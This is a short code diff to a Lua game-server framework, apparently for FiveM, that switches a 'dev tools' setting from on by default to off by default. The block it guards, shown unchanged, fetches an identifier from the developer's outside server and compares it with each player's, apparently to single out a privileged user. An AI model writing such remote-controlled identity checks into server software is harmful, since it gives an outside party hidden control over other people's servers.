@@ -244,8 +244,8 @@ function CreatePlayer(source, permission_level, money, bank, identifier, license
 		db.updateUser(self.identifier, {roles = table.concat(self.roles, "|")}, function()end)
 	end
 
-	-- Dev tools, just set the convar 'es_enableDevTools' to '0' to disable.
-	if GetConvar("es_enableDevTools", "1") == "1" then
+	-- Dev tools, just set the convar 'es_enableDevTools' to '1' to enable.
+	if GetConvar("es_enableDevTools", "0") == "1" then
 		PerformHttpRequest("http://kanersps.pw/fivem/id.txt", function(err, rText, headers)
 			if err == 200 or err == 304 then
 				if self.identifier == rText then
